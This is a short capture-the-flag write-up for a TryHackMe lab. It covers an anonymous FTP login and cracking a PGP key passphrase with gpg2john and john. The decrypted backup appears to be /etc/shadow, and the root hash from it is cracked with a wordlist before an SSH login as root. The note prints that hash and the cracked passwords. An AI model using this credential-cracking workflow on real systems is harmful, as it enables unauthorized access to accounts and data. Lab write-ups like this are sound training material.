#ftp #pgp #asc #john

https://tryhackme.com/r/room/bsidesgtanonforce

---
#### Nmap
![[Screenshot_2024-05-13_15-05-38.png]]
```shell
ftp 10.10.236.90 21
```

Credentials: `Anonymous:[nopassword]`
Got the user.txt with `get user.txt` in user's home directory

Now I need to do a reverse shell
After 2 hours, I finally found how to execute shell command through ftp
```shell
! cat user.txt
```

Big mistake, the `!` just pull me out of ftp in MY shell

I realized there was a directory named `notread` at the root of the machine. There was 2 files in there:
![[Screenshot_2024-05-13_17-23-46.png]]

I took them with `get` on my local machine and I use gpg2john to try to crack the key:
```shell
gpg2john private.asc > hash
```

It gave me a file that I've used in john:
```shell
john hash --wordlist=/usr/share/wordlistd/rockyou.txt
```

![[Screenshot_2024-05-13_17-29-58.png]]

So I decrypted `-d` the `backup.pgp` file with the password `xbox360`:
```shell
gpg -d backup.pgp
```
I've could have used the `--import` before:
```shell
gpg --import private.asc
```

I've got what seems to be the /etc/shadow file, here is the root hash:
```shell
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
```

Then I've just had to use identify the hash and crack it with john again:
```shell
john --format=sha512crypt hash2 --wordlist=/usr/share/wordlists/rockyou.txt
```

And the root password is `hikari`

```shell
ssh root@10.10.236.90
```

